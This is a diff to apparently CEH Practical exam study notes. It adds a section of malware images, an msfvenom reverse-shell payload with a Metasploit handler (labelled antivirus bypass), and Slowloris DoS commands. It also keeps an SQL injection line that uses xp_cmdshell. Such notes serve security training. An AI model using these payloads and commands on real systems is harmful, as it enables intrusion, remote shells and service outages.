@@ -285,6 +285,18 @@ blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --
 ```
 </details>
 
+## Malware Threats
+<details>
+    <summary>Malware Threats </summary>
+![image](https://github.com/Priansh71/CEH-Practical/assets/90593472/66f39b98-d3e1-4070-ae52-ef89fb2c6183)
+
+ ![image](https://github.com/Priansh71/CEH-Practical/assets/90593472/69d2c29b-24b6-451c-8f49-d2aa832b9855)
+ ![image](https://github.com/Priansh71/CEH-Practical/assets/90593472/d6015e48-a7cd-4370-994f-f56cce36f07e)
+ ![image](https://github.com/Priansh71/CEH-Practical/assets/90593472/7a2cfc60-85a8-477d-9a31-1fc31bfcf94e)
+ 
+</details>
+
+
 ## 8) Sniffing
 <details>
     <summary> Wireshark</summary>
@@ -514,7 +526,45 @@ the default credentials of an OT system It lists information such as product cod
       - wireshark
 </details>
 
-## 20)Cryptography
+## 19)Cloud Computing
+<details>
+    <summary>Bypassing Antivirus</summary>
+
+```
+In the terminal type: 
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=IO.IO.IO.11  LPORT=4444 --platform linux -f elf > /root/Desktop/exploit.elf  
+//  -f elf shows the type of payload file we want to create
+This will generate exploit.elf on Desktop
+```
+- upload it it share folder 
+- capture request in msfconsole:
+```
+ use multi/handler
+set payload linux/x86/reverse_tcp 
+LHOST = xx.xx.xx.xx
+LPORT = 4444
+```
+
+</details>
+
+
+<details>
+    <summary>DoS using Slowloris</summary>
+[Reference](https//nmap.org/nsedoc/scripts/http-slowloris-
+check-html)
+- Capture request using wireshark
+- In Terminal
+    
+```
+cd /Desktop/Slowloris
+ls  // slowloris.pl
+./Slowloris.pl -dns xx.xx.xx.xx
+Hence the Dos attack was executed.
+
+```
+</details>
+    
+## 20)Cryptography    
 <details>
     <summary>Cryptography</summary>
 </details>
